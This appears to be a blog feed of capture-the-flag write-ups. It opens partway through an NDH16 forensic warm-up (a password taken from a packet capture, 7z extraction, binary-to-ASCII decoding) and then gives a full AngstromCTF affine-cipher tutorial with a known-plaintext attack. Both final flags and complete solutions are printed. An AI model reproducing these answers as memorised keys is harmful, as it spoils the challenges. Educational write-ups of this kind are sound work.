&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;log=decode&amp;amp;pwd=95%2F%40Jywf5R%40666
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This password gives &lt;strong&gt;95/@Jywf5R@666&lt;/strong&gt; once URL-decoded.
However, the challenge is not over since we don’t have the flag yet…&lt;/p&gt;

&lt;h2 id=&quot;what-about-the-zip&quot;&gt;What about the zip?&lt;/h2&gt;

&lt;p&gt;When trying to unzip the given archive, we face the following error:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip Decode_.zip
Archive:  Decode_.zip
   skipping: Decode_/Decode0         need PK compat. v5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;can &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;v4.6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   creating: Decode_/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It looks like we need another tool to extract the content of this zip. &lt;strong&gt;7z&lt;/strong&gt; should be fine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;7z e Decode_.zip

7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,4 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i5-6200U CPU @ 2.30GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;406E3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM,AES-NI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
1 file, 366 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extracting archive: Decode_.zip
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Decode_.zip
Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 366


Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’re so lucky to have found a password in the pcapng capture! Let’s try it!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
Everything is Ok        

Folders: 1
Files: 1
Size:       442
Compressed: 366
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file “Decode0” is extracted. What does it contain?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Decode0
01101110 01100100 01101000 00110001 00110110 01011111 01100011 01100010 01100110 01100011 01100101 00110101 01100101 00110011 00110110 01100100 01100100 00110011 00110011 01100011 00110110 01100001 01100100 01100011 01100101 00110011 00110010 01100001 00110110 01100010 00110101 00110111 00110111 01100010 01100101 00110001 00110110 00110001 01100010 00111001 00111000 00110001 00110101 00111000 00111001 00110011 00100000 00100000 00101101
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This little one-liner removes spaces in the binary flow and convert it to ASCII:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~$ sed -e &quot;s/ //g&quot; &amp;lt; Decode0 |perl -lpe '$_=pack&quot;B*&quot;,$_'
ndh16_cbfce5e36dd33c6adce32a6b577be161b9815893  -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The job is done! :triangular_flag_on_post:&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">A warm-up forensic challenge proposed by NDH16…</summary></entry><entry><title type="html">A very fine cipher: Warmup - AngstromCTF</title><link href="http://localhost:4000/A-very-fine-cipher-Warmup-AngstromCTF.html" rel="alternate" type="text/html" title="A very fine cipher: Warmup - AngstromCTF" /><published>2018-06-24T23:00:00+02:00</published><updated>2018-06-24T23:00:00+02:00</updated><id>http://localhost:4000/A-very-fine-cipher-Warmup-AngstromCTF</id><content type="html" xml:base="http://localhost:4000/A-very-fine-cipher-Warmup-AngstromCTF.html">&lt;p&gt;Here comes the first Cryptographic challenge! We’ll start with an easy one but nonetheless useful. We will establish the mathematical foundations needed for understanding more complicated codes such as RSA…
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#information-gathering&quot; id=&quot;markdown-toc-information-gathering&quot;&gt;Information gathering&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#affine-cipher&quot; id=&quot;markdown-toc-affine-cipher&quot;&gt;Affine cipher&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#monoalphabetic-substitution-cipher&quot; id=&quot;markdown-toc-monoalphabetic-substitution-cipher&quot;&gt;Monoalphabetic substitution cipher&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#encryption&quot; id=&quot;markdown-toc-encryption&quot;&gt;Encryption&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#decryption&quot; id=&quot;markdown-toc-decryption&quot;&gt;Decryption&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#breaking-the-code&quot; id=&quot;markdown-toc-breaking-the-code&quot;&gt;Breaking the code&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#kerckhoffs-principle&quot; id=&quot;markdown-toc-kerckhoffs-principle&quot;&gt;Kerckhoffs’ Principle&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#frequency-analysis&quot; id=&quot;markdown-toc-frequency-analysis&quot;&gt;Frequency Analysis&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#not-even-funny&quot; id=&quot;markdown-toc-not-even-funny&quot;&gt;Not even funny&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#smart-way---known-plain-attack&quot; id=&quot;markdown-toc-smart-way---known-plain-attack&quot;&gt;Smart way - Known plain attack&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#demonstration&quot; id=&quot;markdown-toc-demonstration&quot;&gt;Demonstration&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#decryption-1&quot; id=&quot;markdown-toc-decryption-1&quot;&gt;Decryption&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;

&lt;p&gt;The challenge statement is very explicit:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Just a quick warm-up cipher for everyone. Honestly, I think it’s &lt;strong&gt;a fine&lt;/strong&gt; cipher.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;myjd{ij_fkwizq}&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The sentence in bold has to be decoded in order to get the flag and to validate the challenge.&lt;/p&gt;

&lt;p&gt;If you’re already familiar with affine cipher or just want to read the challenge’s write-up, you can jump straight to the &lt;em&gt;Breaking the code&lt;/em&gt; section.&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information gathering&lt;/h2&gt;

&lt;p&gt;The information gathering part of the analysis is probably the most important as it can be really time-saving. That’s why we’ll try to gather as much information as possible.&lt;/p&gt;

&lt;p&gt;The first thing that jumps out is the format of the ciphered text. Each CTF contest has its own flag format so participants know when they have solved the challenge.
In the context of AngstromCTF, each flag respects the following convention: &lt;strong&gt;actf{…}&lt;/strong&gt;, which is suspiciously close to our ciphered text.&lt;/p&gt;

&lt;p&gt;Cryptanalysis can be greatly simplified when the plain text language is known. Since AngstromCTF is an international event, the language used is probably english.&lt;/p&gt;

&lt;p&gt;The most useful information turns out to be the discrete hint given in the challenge description. Indeed, “a fine” is in bold for a reason. It’s actually a wordplay with &lt;strong&gt;affine cipher&lt;/strong&gt;… These funny organizers decided to save us a lot of time!&lt;/p&gt;

&lt;h2 id=&quot;affine-cipher&quot;&gt;Affine cipher&lt;/h2&gt;

&lt;p&gt;The affine cipher is a type of &lt;strong&gt;monoalphabetic substitution cipher&lt;/strong&gt; based on a simple mathematical function. It has only been used for its educational purposes due to its weaknesses. We’ll study the functionning of this cipher and how to break it in order to decode our mistery sentence.&lt;/p&gt;

&lt;h3 id=&quot;monoalphabetic-substitution-cipher&quot;&gt;Monoalphabetic substitution cipher&lt;/h3&gt;

&lt;p&gt;A &lt;strong&gt;substitution cipher&lt;/strong&gt; is a method of encrypting which replaces each letter of the plain text by a letter of the ciphered text. In most of the case, the replacement unit is a single letter but it could also be a group of three letters. The &lt;strong&gt;plain text&lt;/strong&gt; and the &lt;strong&gt;ciphered&lt;/strong&gt; one will have &lt;strong&gt;the exact same length&lt;/strong&gt; when using a substitution cipher.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Monoalphabetic&lt;/strong&gt; means that the same alphabet is used for encrypting the whole message. On the contrary, &lt;strong&gt;Polyalphabetic&lt;/strong&gt; substitution ciphers will use multiple alphabets for encrypting the same message. They are generally much &lt;strong&gt;stronger&lt;/strong&gt; than &lt;strong&gt;Monoalphabetic ciphers&lt;/strong&gt; because each letter of the plaintext is usually mapped to multiple different letters in the ciphered text.&lt;/p&gt;

&lt;h3 id=&quot;encryption&quot;&gt;Encryption&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;The first step of the encryption process consists in assigning an integer in the range 0 to \(m-1\) to each letter, where &lt;strong&gt;m is the size of the alphabet&lt;/strong&gt; (usually 26).&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;a&lt;/td&gt;
      &lt;td&gt;b&lt;/td&gt;
      &lt;td&gt;c&lt;/td&gt;
      &lt;td&gt;d&lt;/td&gt;
      &lt;td&gt;e&lt;/td&gt;
      &lt;td&gt;f&lt;/td&gt;
      &lt;td&gt;g&lt;/td&gt;
      &lt;td&gt;h&lt;/td&gt;
      &lt;td&gt;…&lt;/td&gt;
      &lt;td&gt;w&lt;/td&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;y&lt;/td&gt;
      &lt;td&gt;z&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;…&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;23&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Then we have to define a pair of integers \((a,b)\) which will represent &lt;strong&gt;the key&lt;/strong&gt;. In order to be able to decipher the message, &lt;strong&gt;a must be coprime with m&lt;/strong&gt;. If it’s not the case, the same integer will be associated with more than one letter in our table.
This gives the following list of possibilities for \(a\): 1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For the example, we will choose the couple \((a = 5, b = 8)\) as the key.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Now that each letter is associated with an integer and that we have defined the key, we are ready to encrypt the message. In order to do this, we simply have to apply the mathematical formula that defines the affine cipher, with \(x\) being the &lt;strong&gt;integer associated with the letter&lt;/strong&gt; we want to encrypt:&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;E(x) = (ax + b)\mod{m}&lt;/script&gt;

&lt;p&gt;To give you an example, let’s say we want to encrypt the following sentence using the key defined above:&lt;/p&gt;

&lt;p&gt;CRYPTOISLOVE&lt;/p&gt;

&lt;p&gt;We will get the integers associated with each letter as the following:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;C&lt;/td&gt;
      &lt;td&gt;R&lt;/td&gt;
      &lt;td&gt;Y&lt;/td&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;T&lt;/td&gt;
      &lt;td&gt;O&lt;/td&gt;
      &lt;td&gt;I&lt;/td&gt;
      &lt;td&gt;S&lt;/td&gt;
      &lt;td&gt;L&lt;/td&gt;
      &lt;td&gt;O&lt;/td&gt;
      &lt;td&gt;V&lt;/td&gt;
      &lt;td&gt;E&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;17&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Then, we will apply the encryption function for each letter resulting in the following:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;17&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;Detail of the first column:
&lt;script type=&quot;math/tex&quot;&gt;% &lt;![CDATA[
\begin{eqnarray}
E(2) &amp;=&amp; 2\times 5 + 8\mod{26}\\
E(2) &amp;=&amp; 18
\end{eqnarray} %]]&gt;&lt;/script&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;And convert back the obtained integers into letters to get the ciphered message:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;S&lt;/td&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;Y&lt;/td&gt;
      &lt;td&gt;F&lt;/td&gt;
      &lt;td&gt;Z&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;W&lt;/td&gt;
      &lt;td&gt;U&lt;/td&gt;
      &lt;td&gt;L&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;J&lt;/td&gt;
      &lt;td&gt;C&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The encryption is done!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;NOTE: We can notice that some popular shift ciphers such as &lt;strong&gt;Caesar cipher&lt;/strong&gt; or &lt;strong&gt;ROT13&lt;/strong&gt; are basically affine ciphers with the &lt;strong&gt;a coefficient set to 1&lt;/strong&gt; and the &lt;strong&gt;b coefficient representing the shift&lt;/strong&gt;. We can describe these ciphers as affine ciphers using the following keys: &lt;strong&gt;Caesar(1,3)&lt;/strong&gt; &amp;amp; &lt;strong&gt;ROT13(1,13)&lt;/strong&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;decryption&quot;&gt;Decryption&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;The first step of the decryption process consists in replacing each letter of the ciphered text with the corresponding integer.&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;S&lt;/td&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;Y&lt;/td&gt;
      &lt;td&gt;F&lt;/td&gt;
      &lt;td&gt;Z&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;W&lt;/td&gt;
      &lt;td&gt;U&lt;/td&gt;
      &lt;td&gt;L&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;J&lt;/td&gt;
      &lt;td&gt;C&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Then we have to find the &lt;strong&gt;modular multiplicative inverse&lt;/strong&gt; of \(a\). There are different ways to do it which won’t be detailed here. If you’re interested in knowing how to compute it, you should have a look at &lt;a href=&quot;https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm&quot;&gt;Extended Euclidean algorithm&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Euler%27s_theorem&quot;&gt;Euler’s theorem&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In our previous example, the &lt;strong&gt;modular multiplicative inverse&lt;/strong&gt; of \(a\) is 21. We will call it \(a’\).&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Now can apply the following decryption function to each integer of the table and convert the result back into letter to get the deciphered message.&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;D(x) = a'(x-b)\mod{m}&lt;/script&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;20&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;17&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;15&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
      &lt;td&gt;11&lt;/td&gt;
      &lt;td&gt;14&lt;/td&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;After converting the integers back into letters we will recover the original plain text.&lt;/p&gt;

&lt;h2 id=&quot;breaking-the-code&quot;&gt;Breaking the code&lt;/h2&gt;

&lt;p&gt;Now that we have a clearer idea of the mechanisms involved by affine cipher, we can eventually spot the weaknesses. In order to decode the ciphered sentence, we have to either find the key or find another way to recover the plain text.&lt;/p&gt;

&lt;h3 id=&quot;kerckhoffs-principle&quot;&gt;Kerckhoffs’ Principle&lt;/h3&gt;

&lt;p&gt;Kerckhoffs’ Principle is a basic design principle of modern cryptography formulated by Auguste Kerckhoffs in 1883.&lt;/p&gt;

&lt;p&gt;It goes as follows:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;A cryptographic system should be secure even if everything about the system, except the key, is public knowledge.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The affine cipher often uses an alphabet of 26 letters including 12 numbers which are coprime with 26. This gives us a total of \(12 \times 26 = 312\) possible keys.&lt;/p&gt;

&lt;p&gt;This is something we can easily bruteforce so this cipher is considered as highly insecure in the light of Kerckhoffs’ Principle.&lt;/p&gt;

&lt;h3 id=&quot;frequency-analysis&quot;&gt;Frequency Analysis&lt;/h3&gt;

&lt;p&gt;Frequency Analysis is a very popular method of cryptanalysis. It consists in studying the frequency of letters in a ciphertext.
For example, if the most occurent letter in a ciphered text is “Z”, you can suppose that “Z” replaces the most common letter of the source language (which is “E” in the English language).&lt;/p&gt;

&lt;p&gt;Every monoalphabetic substitution cipher is vulnerable to this method of cryptanalysis. However, it requires a long ciphered text for the frequency analysis to be relevant. In the context of this challenge, we only have a single sentence, which is clearly not sufficient. Let’s save this method for another challenge… :wink:&lt;/p&gt;

&lt;h3 id=&quot;not-even-funny&quot;&gt;Not even funny&lt;/h3&gt;

&lt;p&gt;We said earlier that the key was easily crackable thanks to a fine &lt;strong&gt;bruteforce algorithm&lt;/strong&gt;. This is the dumb but efficient way to achieve the challenge.
Feel free to write a small &lt;strong&gt;script&lt;/strong&gt; which will &lt;strong&gt;test the 312 possible keys&lt;/strong&gt; and decode the message. It’s always good to practice our scripting skills.&lt;/p&gt;

&lt;p&gt;However, this may not be necessary to write a script for solving this challenge, as we will see in the next part.&lt;/p&gt;

&lt;h3 id=&quot;smart-way---known-plain-attack&quot;&gt;Smart way - Known plain attack&lt;/h3&gt;

&lt;p&gt;This is where the &lt;em&gt;information gathering&lt;/em&gt; part becomes interesting. We’ve noticed the suspiceous beginning of the ciphered text which is very close to the flag format of this CTF.&lt;/p&gt;

&lt;p&gt;It is quite likely that &lt;strong&gt;actf{…}&lt;/strong&gt; becomes &lt;strong&gt;myjd{…}&lt;/strong&gt; when encrypted. If we find the key that gives such ciphered text, we will be able to decrypt the rest of the flag.&lt;/p&gt;

&lt;p&gt;This is called a &lt;strong&gt;known plain attack&lt;/strong&gt;. We know a part of the plain text and it’s corresponding ciphered text. From that, we can guess the key and decode the whole message. This type of attack is not always possible but it works perfectly in our case.&lt;/p&gt;

&lt;h4 id=&quot;demonstration&quot;&gt;Demonstration&lt;/h4&gt;

&lt;p&gt;Once again, we assign an integer to each letter of the plain and the ciphered text:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;a&lt;/td&gt;
      &lt;td&gt;c&lt;/td&gt;
      &lt;td&gt;t&lt;/td&gt;
      &lt;td&gt;f&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;19&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;m&lt;/td&gt;
      &lt;td&gt;y&lt;/td&gt;
      &lt;td&gt;j&lt;/td&gt;
      &lt;td&gt;d&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12&lt;/td&gt;
      &lt;td&gt;24&lt;/td&gt;
      &lt;td&gt;9&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;According to our hypothesis that the beginning of the ciphered text corresponds to &lt;strong&gt;actf{&lt;/strong&gt;, we have:&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{eqnarray}
	E(0) &amp;=&amp; 12\\
	E(2) &amp;=&amp; 24\\
	E(19) &amp;=&amp; 9\\
	E(5) &amp;=&amp; 3\\
\end{eqnarray} %]]&gt;&lt;/script&gt;

&lt;p&gt;The first equation means that when we encrypt the letter number 0, it gives the letter number 12.
We won’t need more than the first two equations in order to find the key.&lt;/p&gt;

&lt;p&gt;This gives the following system:&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\left\{
\begin{array}{r c l}
0a + b &amp;\equiv&amp; \boxed{12}\mod{26}\\
2a + b &amp;\equiv&amp; 24\mod{26}\\
\end{array}
\right. %]]&gt;&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\begin{array}{r c l}
\Leftrightarrow 2a &amp;\equiv&amp; 12\mod{26}\\
\Leftrightarrow 2a &amp;\equiv&amp; 38\mod{26}\\
\Leftrightarrow a &amp;\equiv&amp; \boxed{19}\mod{26}\\
\end{array} %]]&gt;&lt;/script&gt;

&lt;p&gt;Here is the key!&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;key (19,12)&lt;/script&gt;

&lt;h4 id=&quot;decryption-1&quot;&gt;Decryption&lt;/h4&gt;

&lt;p&gt;Using the key and the previously explained process of decryption, we are able to recover the plain text, which was indeed a magnificent flag!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;actf{it_begins}&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;That’s it for this challenge but don’t worry, it was only the warm-up! :blush: Do not hesitate to leave a comment or to contact me for any question or inquiry.&lt;/p&gt;

